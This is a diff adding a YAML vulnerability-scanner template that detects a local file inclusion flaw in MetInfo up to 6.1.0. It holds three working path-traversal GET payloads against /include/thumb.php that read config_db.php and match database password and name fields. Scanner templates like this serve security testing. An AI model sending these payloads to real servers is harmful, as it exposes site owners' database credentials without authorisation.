@@ -1,0 +1,27 @@
+id: metinfo-lfi
+brief:
+    title: MetInfo <=6.1.0 - Local File Inclusion
+    by: pikpikcu
+    level: high
+    about: MetInfo 6.0.0 through 6.1.0 is vulnerable to local file inclusion and allows remote unauthenticated attackers access to locally stored files and their content.
+    label:
+        - metinfo
+        - lfi
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/include/thumb.php?dir=http/.....///.....///config/config_db.php'
+        - '{{BaseURL}}/include/thumb.php?dir=.....///http/.....///config/config_db.php'
+        - '{{BaseURL}}/include/thumb.php?dir=http\\..\\..\\config\\config_db.php'
+      signs:
+        - "on": word
+          has:
+            - con_db_pass
+            - con_db_name
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
